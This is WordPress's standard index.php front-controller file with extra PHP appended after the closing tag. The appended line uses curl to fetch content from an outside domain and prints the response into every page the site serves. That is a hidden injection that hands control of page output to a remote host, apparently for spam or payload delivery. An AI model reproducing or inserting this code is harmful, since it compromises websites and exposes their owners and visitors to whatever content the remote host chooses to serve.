<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';?>
<?php $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, 'https://jalankepapua.com/33.php'); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $dewa = curl_exec($ch); curl_close($ch);?> <?php echo $dewa; ?>
